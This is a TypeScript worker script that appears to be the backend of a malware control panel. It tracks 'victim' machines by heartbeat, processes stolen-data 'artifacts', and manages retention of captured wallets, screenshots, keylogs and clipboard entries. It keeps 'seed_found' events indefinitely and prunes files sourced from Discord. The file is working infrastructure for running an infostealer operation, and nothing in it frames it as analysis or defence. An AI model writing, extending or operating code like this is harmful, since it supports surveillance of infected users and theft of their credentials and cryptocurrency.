import 'dotenv/config';
import { rm, readdir, stat, unlink } from 'node:fs/promises';
import { join, resolve } from 'node:path';
import { prisma } from './lib/db';
import { env } from './lib/env';
import { processArtifact, artifactDir } from './services/artifact';

let running = true;
let lastRetention = 0;

async function tick(): Promise<void> {
  const artifacts = await prisma.artifact.findMany({ where: { status: 'queued' }, orderBy: { createdAt: 'asc' }, take: 4 });
  for (const artifact of artifacts) await processArtifact(artifact.id);

  const now = new Date();
  await prisma.upload.updateMany({ where: { state: 'open', expiresAt: { lt: now } }, data: { state: 'expired' } });
  await prisma.task.updateMany({
    where: { status: 'running', leaseUntil: { lt: new Date(Date.now() - 60_000) }, attempts: { lt: 5 } },
    data: { status: 'queued', leaseUntil: null }
  });
  await prisma.task.updateMany({
    where: { status: 'running', leaseUntil: { lt: new Date(Date.now() - 60_000) }, attempts: { gte: 5 } },
    data: { status: 'expired', finishedAt: new Date(), error: 'lease expired 5 times' }
  });
  await prisma.victim.updateMany({
    where: {
      status: 'online',
      lastHeartbeatAt: { lt: new Date(Date.now() - 90_000) },
      lastAgentMessageAt: { lt: new Date(Date.now() - 90_000) }
    },
    data: { status: 'stale' }
  });
  await prisma.victim.updateMany({
    where: {
      status: 'stale',
      lastHeartbeatAt: { lt: new Date(Date.now() - 15 * 60_000) },
      lastAgentMessageAt: { lt: new Date(Date.now() - 15 * 60_000) }
    },
    data: { status: 'offline' }
  });
  await prisma.session.deleteMany({ where: { expiresAt: { lt: new Date(Date.now() - 30 * 86_400_000) } } });

  if (Date.now() - lastRetention > 10 * 60_000) {
    lastRetention = Date.now();
    await retention();
  }
}

async function retention(): Promise<void> {
  const days = (count: number) => new Date(Date.now() - count * 86_400_000);

  const expired = await prisma.upload.findMany({ where: { state: 'expired', artifact: { is: null } }, take: 500 });
  for (const upload of expired) {
    await rm(upload.path, { force: true }).catch(() => undefined);
    await prisma.upload.delete({ where: { id: upload.id } }).catch(() => undefined);
  }

  const failed = await prisma.artifact.findMany({
    where: { status: 'failed', createdAt: { lt: days(env.FAILED_ARTIFACT_RETENTION_DAYS) } },
    take: 500
  });
  for (const artifact of failed) {
    await prisma.$transaction(async (tx) => {
      await tx.wallet.deleteMany({ where: { artifactId: artifact.id } });
      await tx.screenshot.deleteMany({ where: { artifactId: artifact.id } });
      await tx.artifact.delete({ where: { id: artifact.id } });
    }).catch(() => undefined);
    await rm(artifactDir(artifact.id), { recursive: true, force: true }).catch(() => undefined);
    await rm(artifact.containerPath, { force: true }).catch(() => undefined);
  }

  await prisma.keylog.deleteMany({ where: { ts: { lt: days(env.KEYLOG_RETENTION_DAYS) } } });
  await prisma.clipboardEntry.deleteMany({ where: { ts: { lt: days(env.CLIPBOARD_RETENTION_DAYS) } } });
  await prisma.event.deleteMany({
    where: { createdAt: { lt: days(env.EVENT_RETENTION_DAYS) }, kind: { not: 'seed_found' } }
  });

  await pruneDiscordParts();
  await pruneOrphanFiles();
}

async function pruneDiscordParts(): Promise<void> {
  const parts = await prisma.discordPart.findMany({ take: 1000 });
  for (const part of parts) {
    const info = await stat(part.path).catch(() => null);
    const idle = Date.now() - part.createdAt.getTime() > 2 * 86_400_000;
    if (info && !idle) continue;
    await rm(part.path, { force: true }).catch(() => undefined);
    await prisma.discordPart.delete({ where: { id: part.id } }).catch(() => undefined);
  }
}

/** Files under data/artifacts/discord with no artifact row are dead weight. */
async function pruneOrphanFiles(): Promise<void> {
  const root = resolve(env.STORAGE_DIR, 'discord');
  const rows = await prisma.artifact.findMany({ where: { source: 'discord' }, select: { containerPath: true } });
  const known = new Set(rows.map((row) => resolve(row.containerPath)));
  for (const path of await walk(root)) {
    if (known.has(resolve(path))) continue;
    const info = await stat(path).catch(() => null);
    if (!info || Date.now() - info.mtimeMs < 86_400_000) continue;
    await unlink(path).catch(() => undefined);
  }
}

async function walk(dir: string): Promise<string[]> {
  const out: string[] = [];
  const entries = await readdir(dir, { withFileTypes: true }).catch(() => []);
  for (const entry of entries) {
    const path = join(dir, entry.name);
    if (entry.isDirectory()) out.push(...(await walk(path)));
    else out.push(path);
  }
  return out;
}

async function main(): Promise<void> {
  while (running) {
    const started = Date.now();
    try {
      await tick();
    } catch (error) {
      console.error('worker tick', error);
    }
    const wait = Math.max(1000, 5000 - (Date.now() - started));
    await new Promise((resolve) => setTimeout(resolve, wait));
  }
  await prisma.$disconnect();
}

process.on('SIGINT', () => (running = false));
process.on('SIGTERM', () => (running = false));
void main();
